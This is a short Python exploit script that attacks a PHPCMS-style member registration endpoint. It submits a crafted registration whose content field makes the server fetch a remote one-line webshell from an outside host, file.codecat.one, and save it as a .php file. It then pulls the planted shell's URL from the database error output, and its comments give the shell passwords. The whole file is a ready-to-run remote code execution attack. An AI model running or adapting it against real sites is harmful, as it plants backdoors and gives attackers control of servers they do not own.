# -*- coding:utf-8 -*-

'''
----------------------
Author : Akkuman
Blog   : hacktech.cn
----------------------
'''

import requests
import sys
from random import Random

chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'

def main():
    host = raw_input('URL : ')
    url = host + "/index.php?m=member&c=index&a=register&siteid=1"

    data = {
        "siteid": "1",
        "modelid": "1",
        "username": "dsakkfaffdssdudi",
        "password": "123456",
        "email": "dsakkfddsjdi@qq.com",
        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0
        #"info[content]": "<img src=http://115.159.202.71/1.txt?.php#.jpg>",   #密码023
        "info[content]": "<img src=http://file.codecat.one/oneword.txt?.php#.jpg>",   #密码akkuman
        "dosubmit": "1",
        "protocol": "",
    }
    try:
        rand_name = chars[Random().randint(0, len(chars) - 1)]
        data["username"] = "akkuman_%s" % rand_name
        data["email"] = "akkuman_%s@qq.com" % rand_name
        
        htmlContent = requests.post(url, data=data)

        successUrl = ""
        if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
            successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
            print("[*]Shell  : %s" % successUrl)
        if successUrl == "":
            print("[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n")

    except:
        print("Request Error")


if __name__ == '__main__':
    main()
